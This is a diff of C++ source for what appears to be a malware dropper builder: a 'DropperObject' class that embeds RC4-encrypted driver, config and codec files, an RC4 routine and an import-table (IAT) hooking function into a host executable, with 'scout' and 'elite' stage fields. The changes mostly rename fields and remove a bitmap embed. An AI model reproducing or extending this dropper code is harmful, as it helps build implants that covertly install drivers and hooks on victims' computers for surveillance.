@@ -115,8 +115,8 @@ DWORD DropperObject::_build_scout( WINSTARTFUNC OriginalEntryPoint, std::string 
 	cout << "GetCommandLineWHook: " << std::hex << GetCommandLineWHook << " GetCommandLineWHook: " << std::hex << GetCommandLineWHook << endl;
 
 	// HookIAT code
-	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookCall, ptr);
-	cout << "HookIAT is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
+	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookIAT, ptr);
+	cout << "HookIAT is " << header->functions.hookIAT.size << " bytes long, offset " << (DWORD)header->functions.hookIAT.offset << endl;
 
 	header->restore.offset = ptr - _data.get();
 
@@ -184,7 +184,6 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	ptr = _embedFile(header->rc4key, _files.driver64, header->files.names.driver64, header->files.driver64, ptr);
 	ptr = _embedFile(header->rc4key, _files.config, header->files.names.config, header->files.config, ptr);
 	ptr = _embedFile(header->rc4key, _files.codec, header->files.names.codec, header->files.codec, ptr);
-	ptr = _embedFile(header->rc4key, _files.bitmap, header->files.names.bitmap, header->files.bitmap, ptr);
 	
 	// compute total data section size and store in buffer
 	dataBufferSize = ptr - _data.get();
@@ -235,9 +234,9 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	ptr += _embedFunction((PVOID)ArcFour, (PVOID)ArcFour_End, header->functions.rc4, ptr);
 	cout << "RC4 is " << header->functions.rc4.size << " bytes long, offset " << (DWORD)header->functions.rc4.offset << endl;
 	
-	// hookCall code
-	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookCall, ptr);
-	cout << "hookCall is " << header->functions.hookCall.size << " bytes long, offset " << (DWORD)header->functions.hookCall.offset << endl;
+	// hookIAT code
+	ptr += _embedFunction((PVOID)HookIAT, (PVOID)HookIAT_End, header->functions.hookIAT, ptr);
+	cout << "hookIAT is " << header->functions.hookIAT.size << " bytes long, offset " << (DWORD)header->functions.hookIAT.offset << endl;
 	
 	cout << "Original ptr: " << hex << (DWORD)ptr << ", aligned: " << hex << (DWORD)alignToDWORD((DWORD)ptr) << endl;
 	
@@ -249,7 +248,7 @@ DWORD DropperObject::_build( WINSTARTFUNC OriginalEntryPoint, std::string fPrefi
 	header->isScout = FALSE;
 
 	memcpy(header->instDir, installDir.c_str(), sizeof(header->instDir));
-	memcpy(header->fPrefix, fPrefix.c_str(), sizeof(header->fPrefix));
+	memcpy(header->eliteExports, fPrefix.c_str(), sizeof(header->eliteExports));
 
 	// compute total size
 	_size = alignToDWORD(ptr - _data.get());
